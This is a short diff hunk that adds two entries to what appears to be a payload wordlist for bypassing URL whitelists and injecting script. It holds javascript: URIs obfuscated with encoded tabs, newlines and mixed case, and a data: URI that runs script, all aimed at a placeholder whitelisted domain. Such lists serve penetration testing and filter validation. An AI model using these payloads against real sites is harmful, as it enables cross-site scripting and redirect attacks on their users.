@@ -275,3 +275,5 @@ java%0ascript:alert(1)
 java%09script:alert(1)
 java%0dscript:alert(1)
 javascript://%0aalert(1)
+data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
